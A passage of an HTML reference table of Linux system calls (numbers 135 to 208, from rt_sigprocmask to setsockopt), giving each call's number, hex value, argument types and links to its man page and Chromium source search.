<td align="center">0x86</td>
<td>int</td>
<td>const struct sigaction *</td>
<td>struct sigaction *</td>
<td>size_t</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">135</td>
<td>rt_sigprocmask</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigprocmask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigprocmask">cs/</a></td>
<td align="center">0x87</td>
<td>int how</td>
<td>sigset_t *set</td>
<td>sigset_t *oset</td>
<td>size_t sigsetsize</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">136</td>
<td>rt_sigpending</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigpending.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigpending">cs/</a></td>
<td align="center">0x88</td>
<td>sigset_t *set</td>
<td>size_t sigsetsize</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">137</td>
<td>rt_sigtimedwait</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigtimedwait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigtimedwait">cs/</a></td>
<td align="center">0x89</td>
<td>const sigset_t *uthese</td>
<td>siginfo_t *uinfo</td>
<td>const struct __kernel_timespec *uts</td>
<td>size_t sigsetsize</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">138</td>
<td>rt_sigqueueinfo</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigqueueinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigqueueinfo">cs/</a></td>
<td align="center">0x8a</td>
<td>pid_t pid</td>
<td>int sig</td>
<td>siginfo_t *uinfo</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">139</td>
<td>rt_sigreturn</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigreturn.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigreturn">cs/</a></td>
<td align="center">0x8b</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">140</td>
<td>setpriority</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setpriority.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setpriority">cs/</a></td>
<td align="center">0x8c</td>
<td>int which</td>
<td>int who</td>
<td>int niceval</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">141</td>
<td>getpriority</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getpriority.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpriority">cs/</a></td>
<td align="center">0x8d</td>
<td>int which</td>
<td>int who</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">142</td>
<td>reboot</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/reboot.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*reboot">cs/</a></td>
<td align="center">0x8e</td>
<td>int magic1</td>
<td>int magic2</td>
<td>unsigned int cmd</td>
<td>void *arg</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">143</td>
<td>setregid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setregid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setregid">cs/</a></td>
<td align="center">0x8f</td>
<td>gid_t rgid</td>
<td>gid_t egid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">144</td>
<td>setgid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgid">cs/</a></td>
<td align="center">0x90</td>
<td>gid_t gid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">145</td>
<td>setreuid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setreuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setreuid">cs/</a></td>
<td align="center">0x91</td>
<td>uid_t ruid</td>
<td>uid_t euid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">146</td>
<td>setuid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setuid">cs/</a></td>
<td align="center">0x92</td>
<td>uid_t uid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">147</td>
<td>setresuid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setresuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresuid">cs/</a></td>
<td align="center">0x93</td>
<td>uid_t ruid</td>
<td>uid_t euid</td>
<td>uid_t suid</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">148</td>
<td>getresuid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getresuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresuid">cs/</a></td>
<td align="center">0x94</td>
<td>uid_t *ruid</td>
<td>uid_t *euid</td>
<td>uid_t *suid</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">149</td>
<td>setresgid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setresgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresgid">cs/</a></td>
<td align="center">0x95</td>
<td>gid_t rgid</td>
<td>gid_t egid</td>
<td>gid_t sgid</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">150</td>
<td>getresgid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getresgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresgid">cs/</a></td>
<td align="center">0x96</td>
<td>gid_t *rgid</td>
<td>gid_t *egid</td>
<td>gid_t *sgid</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">151</td>
<td>setfsuid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsuid">cs/</a></td>
<td align="center">0x97</td>
<td>uid_t uid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">152</td>
<td>setfsgid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsgid">cs/</a></td>
<td align="center">0x98</td>
<td>gid_t gid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">153</td>
<td>times</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/times.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*times">cs/</a></td>
<td align="center">0x99</td>
<td>struct tms *tbuf</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">154</td>
<td>setpgid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setpgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setpgid">cs/</a></td>
<td align="center">0x9a</td>
<td>pid_t pid</td>
<td>pid_t pgid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">155</td>
<td>getpgid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getpgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpgid">cs/</a></td>
<td align="center">0x9b</td>
<td>pid_t pid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">156</td>
<td>getsid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getsid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsid">cs/</a></td>
<td align="center">0x9c</td>
<td>pid_t pid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">157</td>
<td>setsid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setsid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setsid">cs/</a></td>
<td align="center">0x9d</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">158</td>
<td>getgroups</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getgroups.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgroups">cs/</a></td>
<td align="center">0x9e</td>
<td>int gidsetsize</td>
<td>gid_t *grouplist</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">159</td>
<td>setgroups</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setgroups.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgroups">cs/</a></td>
<td align="center">0x9f</td>
<td>int gidsetsize</td>
<td>gid_t *grouplist</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">160</td>
<td>uname</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/uname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*uname">cs/</a></td>
<td align="center">0xa0</td>
<td>struct old_utsname *</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">161</td>
<td>sethostname</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sethostname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sethostname">cs/</a></td>
<td align="center">0xa1</td>
<td>char *name</td>
<td>int len</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">162</td>
<td>setdomainname</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setdomainname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setdomainname">cs/</a></td>
<td align="center">0xa2</td>
<td>char *name</td>
<td>int len</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">163</td>
<td>getrlimit</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getrlimit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrlimit">cs/</a></td>
<td align="center">0xa3</td>
<td>unsigned int resource</td>
<td>struct rlimit *rlim</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">164</td>
<td>setrlimit</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setrlimit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setrlimit">cs/</a></td>
<td align="center">0xa4</td>
<td>unsigned int resource</td>
<td>struct rlimit *rlim</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">165</td>
<td>getrusage</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getrusage.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrusage">cs/</a></td>
<td align="center">0xa5</td>
<td>int who</td>
<td>struct rusage *ru</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">166</td>
<td>umask</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/umask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*umask">cs/</a></td>
<td align="center">0xa6</td>
<td>int mask</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">167</td>
<td>prctl</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/prctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*prctl">cs/</a></td>
<td align="center">0xa7</td>
<td>int option</td>
<td>unsigned long arg2</td>
<td>unsigned long arg3</td>
<td>unsigned long arg4</td>
<td>unsigned long arg5</td>
<td>-</td>
</tr>
<tr>
<td align="center">168</td>
<td>getcpu</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getcpu.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getcpu">cs/</a></td>
<td align="center">0xa8</td>
<td>unsigned *cpu</td>
<td>unsigned *node</td>
<td>struct getcpu_cache *cache</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">169</td>
<td>gettimeofday</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/gettimeofday.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*gettimeofday">cs/</a></td>
<td align="center">0xa9</td>
<td>struct __kernel_old_timeval *tv</td>
<td>struct timezone *tz</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">170</td>
<td>settimeofday</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/settimeofday.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*settimeofday">cs/</a></td>
<td align="center">0xaa</td>
<td>struct __kernel_old_timeval *tv</td>
<td>struct timezone *tz</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">171</td>
<td>adjtimex</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/adjtimex.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*adjtimex">cs/</a></td>
<td align="center">0xab</td>
<td>struct __kernel_timex *txc_p</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">172</td>
<td>getpid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getpid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpid">cs/</a></td>
<td align="center">0xac</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">173</td>
<td>getppid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getppid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getppid">cs/</a></td>
<td align="center">0xad</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">174</td>
<td>getuid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getuid">cs/</a></td>
<td align="center">0xae</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">175</td>
<td>geteuid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/geteuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*geteuid">cs/</a></td>
<td align="center">0xaf</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">176</td>
<td>getgid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgid">cs/</a></td>
<td align="center">0xb0</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">177</td>
<td>getegid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getegid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getegid">cs/</a></td>
<td align="center">0xb1</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">178</td>
<td>gettid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/gettid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*gettid">cs/</a></td>
<td align="center">0xb2</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">179</td>
<td>sysinfo</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sysinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sysinfo">cs/</a></td>
<td align="center">0xb3</td>
<td>struct sysinfo *info</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">180</td>
<td>mq_open</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_open">cs/</a></td>
<td align="center">0xb4</td>
<td>const char *name</td>
<td>int oflag</td>
<td>umode_t mode</td>
<td>struct mq_attr *attr</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">181</td>
<td>mq_unlink</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_unlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_unlink">cs/</a></td>
<td align="center">0xb5</td>
<td>const char *name</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">182</td>
<td>mq_timedsend</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_timedsend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_timedsend">cs/</a></td>
<td align="center">0xb6</td>
<td>mqd_t mqdes</td>
<td>const char *msg_ptr</td>
<td>size_t msg_len</td>
<td>unsigned int msg_prio</td>
<td>const struct __kernel_timespec *abs_timeout</td>
<td>-</td>
</tr>
<tr>
<td align="center">183</td>
<td>mq_timedreceive</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_timedreceive.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_timedreceive">cs/</a></td>
<td align="center">0xb7</td>
<td>mqd_t mqdes</td>
<td>char *msg_ptr</td>
<td>size_t msg_len</td>
<td>unsigned int *msg_prio</td>
<td>const struct __kernel_timespec *abs_timeout</td>
<td>-</td>
</tr>
<tr>
<td align="center">184</td>
<td>mq_notify</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_notify.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_notify">cs/</a></td>
<td align="center">0xb8</td>
<td>mqd_t mqdes</td>
<td>const struct sigevent *notification</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">185</td>
<td>mq_getsetattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_getsetattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_getsetattr">cs/</a></td>
<td align="center">0xb9</td>
<td>mqd_t mqdes</td>
<td>const struct mq_attr *mqstat</td>
<td>struct mq_attr *omqstat</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">186</td>
<td>msgget</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/msgget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgget">cs/</a></td>
<td align="center">0xba</td>
<td>key_t key</td>
<td>int msgflg</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">187</td>
<td>msgctl</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/msgctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgctl">cs/</a></td>
<td align="center">0xbb</td>
<td>int msqid</td>
<td>int cmd</td>
<td>struct msqid_ds *buf</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">188</td>
<td>msgrcv</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/msgrcv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgrcv">cs/</a></td>
<td align="center">0xbc</td>
<td>int msqid</td>
<td>struct msgbuf *msgp</td>
<td>size_t msgsz</td>
<td>long msgtyp</td>
<td>int msgflg</td>
<td>-</td>
</tr>
<tr>
<td align="center">189</td>
<td>msgsnd</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/msgsnd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgsnd">cs/</a></td>
<td align="center">0xbd</td>
<td>int msqid</td>
<td>struct msgbuf *msgp</td>
<td>size_t msgsz</td>
<td>int msgflg</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">190</td>
<td>semget</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/semget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semget">cs/</a></td>
<td align="center">0xbe</td>
<td>key_t key</td>
<td>int nsems</td>
<td>int semflg</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">191</td>
<td>semctl</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/semctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semctl">cs/</a></td>
<td align="center">0xbf</td>
<td>int semid</td>
<td>int semnum</td>
<td>int cmd</td>
<td>unsigned long arg</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">192</td>
<td>semtimedop</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/semtimedop.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semtimedop">cs/</a></td>
<td align="center">0xc0</td>
<td>int semid</td>
<td>struct sembuf *sops</td>
<td>unsigned nsops</td>
<td>const struct __kernel_timespec *timeout</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">193</td>
<td>semop</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/semop.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semop">cs/</a></td>
<td align="center">0xc1</td>
<td>int semid</td>
<td>struct sembuf *sops</td>
<td>unsigned nsops</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">194</td>
<td>shmget</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/shmget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmget">cs/</a></td>
<td align="center">0xc2</td>
<td>key_t key</td>
<td>size_t size</td>
<td>int flag</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">195</td>
<td>shmctl</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/shmctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmctl">cs/</a></td>
<td align="center">0xc3</td>
<td>int shmid</td>
<td>int cmd</td>
<td>struct shmid_ds *buf</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">196</td>
<td>shmat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/shmat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmat">cs/</a></td>
<td align="center">0xc4</td>
<td>int shmid</td>
<td>char *shmaddr</td>
<td>int shmflg</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">197</td>
<td>shmdt</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/shmdt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmdt">cs/</a></td>
<td align="center">0xc5</td>
<td>char *shmaddr</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">198</td>
<td>socket</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/socket.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*socket">cs/</a></td>
<td align="center">0xc6</td>
<td>int</td>
<td>int</td>
<td>int</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">199</td>
<td>socketpair</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/socketpair.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*socketpair">cs/</a></td>
<td align="center">0xc7</td>
<td>int</td>
<td>int</td>
<td>int</td>
<td>int *</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">200</td>
<td>bind</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/bind.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bind">cs/</a></td>
<td align="center">0xc8</td>
<td>int</td>
<td>struct sockaddr *</td>
<td>int</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">201</td>
<td>listen</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/listen.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*listen">cs/</a></td>
<td align="center">0xc9</td>
<td>int</td>
<td>int</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">202</td>
<td>accept</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/accept.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*accept">cs/</a></td>
<td align="center">0xca</td>
<td>int</td>
<td>struct sockaddr *</td>
<td>int *</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">203</td>
<td>connect</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/connect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*connect">cs/</a></td>
<td align="center">0xcb</td>
<td>int</td>
<td>struct sockaddr *</td>
<td>int</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">204</td>
<td>getsockname</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getsockname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsockname">cs/</a></td>
<td align="center">0xcc</td>
<td>int</td>
<td>struct sockaddr *</td>
<td>int *</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">205</td>
<td>getpeername</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getpeername.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpeername">cs/</a></td>
<td align="center">0xcd</td>
<td>int</td>
<td>struct sockaddr *</td>
<td>int *</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">206</td>
<td>sendto</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sendto.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendto">cs/</a></td>
<td align="center">0xce</td>
<td>int</td>
<td>void *</td>
<td>size_t</td>
<td>unsigned</td>
<td>struct sockaddr *</td>
<td>int</td>
</tr>
<tr>
<td align="center">207</td>
<td>recvfrom</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/recvfrom.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvfrom">cs/</a></td>
<td align="center">0xcf</td>
<td>int</td>
<td>void *</td>
<td>size_t</td>
<td>unsigned</td>
<td>struct sockaddr *</td>
<td>int *</td>
</tr>
<tr>
<td align="center">208</td>
<td>setsockopt</td>
